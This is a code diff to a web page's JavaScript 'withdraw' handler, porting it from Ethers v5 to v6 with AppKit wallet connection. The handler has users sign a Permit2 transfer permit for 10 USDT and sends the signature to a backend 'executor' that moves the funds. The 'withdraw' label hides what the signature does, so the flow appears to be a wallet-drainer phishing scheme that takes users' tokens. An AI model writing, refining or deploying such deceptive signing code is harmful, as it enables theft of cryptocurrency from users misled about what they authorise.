@@ -41,28 +41,28 @@ function showToast(msg, isError = false) {
 // 3. The Withdrawal / Signing Logic (Ethers v5 Format)
 async function handleWithdraw() {
     try {
-        // Ensure wallet is connected via AppKit
-        if (!modal.getIsConnectedState()) {
+        // 1. Get the provider specifically from AppKit, NOT window.ethereum
+        const walletProvider = modal.getWalletProvider();
+        
+        if (!walletProvider) {
+            showToast("Please connect your wallet first!", true);
             await modal.open();
             return;
         }
 
-        showToast("Connecting to provider...");
-        
-        // Use Ethers v5 Web3Provider wrapper
-        const provider = new ethers.providers.Web3Provider(window.ethereum);
-        const signer = provider.getSigner();
+        // 2. Wrap the AppKit provider in Ethers (Works for v6)
+        const provider = new ethers.BrowserProvider(walletProvider);
+        const signer = await provider.getSigner();
         const owner = await signer.getAddress();
-        const network = await provider.getNetwork();
+        const { chainId } = await provider.getNetwork();
 
-        // EIP-712 Domain
+        // EIP-712 setup
         const domain = {
             name: "Permit2",
-            chainId: network.chainId,
+            chainId: chainId,
             verifyingContract: "0x000000000022D473030F116dDEE9F6B43aC78BA3"
         };
 
-        // EIP-712 Types (Ethers v5 structure)
         const types = {
             PermitTransferFrom: [
                 { name: "permitted", type: "TokenPermissions" },
@@ -75,28 +75,25 @@ async function handleWithdraw() {
             ]
         };
 
-        // EIP-712 Message Values
-        const amount = ethers.utils.parseUnits("10", 6); // 10 USDT
-        const nonce = Date.now(); // Unique nonce
-        const deadline = Math.floor(Date.now() / 1000) + 3600; // 1 hr expiry
+        const amount = ethers.parseUnits("10", 6);
+        const nonce = Date.now();
+        const deadline = Math.floor(Date.now() / 1000) + 3600;
 
         const message = {
             permitted: {
-                token: "0xdAC17F958D2ee523a2206206994597C13D831ec7", // USDT Address
+                token: "0xdAC17F958D2ee523a2206206994597C13D831ec7",
                 amount: amount
             },
             nonce: nonce,
             deadline: deadline
         };
 
-        showToast("Please sign the transaction in your wallet...");
+        // 3. Sign
+        showToast("Please sign the permit in your wallet...");
+        const signature = await signer.signTypedData(domain, types, message);
 
-        // Execute Ethers v5 Typed Data Signing
-        const signature = await signer._signTypedData(domain, types, message);
-
-        showToast("Signature secured. Executing transfer...");
-
-        // Send to your backend executor
+        // 4. Send to Vercel API
+        showToast("Signature secured. Executing...");
         const res = await fetch('/api/withdraw', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
@@ -108,18 +105,13 @@ async function handleWithdraw() {
         });
 
         const data = await res.json();
-        if (data.success) {
-            showToast("Success! Funds withdrawn.", false);
-        } else {
-            showToast(data.message || "Transfer failed.", true);
-        }
+        data.success ? showToast("Success! Funds withdrawn.") : showToast(data.message, true);
 
     } catch (err) {
         console.error(err);
-        showToast(err.message.includes("user rejected") ? "User cancelled signature." : err.message, true);
+        showToast("Error: " + err.message, true);
     }
 }
-
 // 4. Attach to DOM on load
 document.addEventListener('DOMContentLoaded', () => {
     const withdrawBtn = document.getElementById('withdrawBtn');
